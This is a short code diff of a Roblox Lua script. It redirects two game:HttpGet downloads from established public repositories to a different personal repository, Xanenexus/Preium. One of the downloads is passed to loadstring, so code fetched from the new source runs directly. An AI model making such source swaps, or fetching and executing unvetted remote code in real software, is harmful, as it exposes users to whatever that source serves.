@@ -172,7 +172,7 @@ do -- * Load Region of Déjà Vu
 		pcall(function()
 			local b64_enc_buf = loadstring(
 				game:HttpGet(
-					"https://raw.githubusercontent.com/daily3014/rbx-cryptography/refs/heads/main/src/Utilities/Base64.luau",
+					"https://raw.githubusercontent.com/Xanenexus/Preium/refs/heads/main/Base64.luau",
 					true
 				),
 				"Base64"
@@ -1893,7 +1893,7 @@ do
 			API_Dump = service.HttpService:JSONEncode(
 				service.HttpService:JSONDecode(
 					game:HttpGet(
-						"https://raw.githubusercontent.com/MaximumADHD/Roblox-Client-Tracker/roblox/Mini-API-Dump.json",
+						"https://raw.githubusercontent.com/Xanenexus/Preium/refs/heads/main/Tracker-roblox.json",
 						true
 					)
 				).Classes
